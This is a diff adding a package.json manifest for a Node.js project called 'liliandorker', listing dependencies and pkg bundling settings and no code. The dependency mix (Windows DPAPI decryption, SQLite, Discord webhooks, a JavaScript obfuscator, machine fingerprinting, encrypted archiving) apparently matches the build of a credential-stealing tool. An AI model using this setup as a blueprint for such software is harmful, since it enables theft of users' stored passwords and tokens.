@@ -1,0 +1,38 @@
+{
+  "dependencies": {
+    "archiver": "^5.3.1",
+    "archiver-zip-encrypted": "^1.0.11",
+    "axios": "^0.27.2",
+    "buffer-replace": "^1.0.0",
+    "discord-webhook-node": "^1.1.8",
+    "is-wsl": "^2.2.0",
+    "javascript-obfuscator": "^4.0.0",
+    "nexe-natives-fix": "^1.0.1",
+    "node-gyp": "^9.1.0",
+    "node-machine-id": "^1.1.12",
+    "node-resourcehacker": "^1.2.1",
+    "request": "^2.88.2",
+    "sqlite3": "^5.0.8",
+    "systeminformation": "^5.11.16",
+    "temp-dir": "^2.0.0",
+    "win-dpapi": "^1.1.0",
+    "zip-lib": "^0.7.3"
+  },
+  "nodeVersion": "system",
+  "name": "liliandorker",
+  "version": "6.9.6",
+  "description": "",
+  "main": "./index.js",
+  "bin": "./index.js",
+  "pkg": {
+    "assets": [
+      "./node_modules",
+      "./utils",
+      "./config",
+      "./index.js"
+    ]
+  },
+  "devDependencies": {
+    "cross-env": "^7.0.3"
+  }
+}
